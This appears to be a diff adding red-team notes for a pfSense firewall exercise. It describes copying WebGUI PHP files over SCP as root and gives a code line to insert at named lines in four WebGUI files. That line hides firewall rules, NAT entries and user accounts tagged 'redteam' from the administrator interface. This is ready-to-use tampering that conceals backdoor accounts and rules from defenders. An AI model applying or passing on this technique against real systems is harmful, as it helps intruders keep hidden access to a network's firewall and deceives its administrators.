@@ -1,0 +1,31 @@
+PFSense information:
+
+PFSense keeps the php files for the WebGUI in /usr/local/www
+
+To SCP files from PFSense:
+scp root@( PFSense IP Address ):/usr/local/www/( PFSense File ) /( Destination )
+
+To SCP files to PSFense:
+scp ( local file ) root@( PFSense IP Address ):/usr/local/www
+
+Why?  That is just SCP dummy.  Yes, it is.. but the issue was that using "admin" doesn't work and you have to use "root".
+
+Fun code to insert into some files:
+
+if (strpos($___ent['descr'], "redteam"))
+continue;
+
+into the following files:
+
+File                          ~Line #            Variable Name
+firewall_nat.php              Line 227           natent
+firewall_rules.php            Line 414           filterent
+system_usermanager.php        Line 953           userent
+firewall_nat_1to1.php         Line 203           natent
+
+Which will hide rules, nats, 1to1 nats, and users with the string "redteam" at the end of the description/fullname.  
+So, don't start the description/fullname with "redteam".  "SSHredteam" == good, "redteamRule" != good.
+
+Issues?  Well, when you go to edit a NAT/1to1 NAT/Rule the webGUI array starts with id of 0 but NAT/1to1 NAT/Rules 
+in the database have hidden elements so the webGUI might pull up a hidden NAT/1to1 NAT/Rule.  I left this in place 
+so the blue team can still fix stuff by altering the URL and changing the URL variable "id".
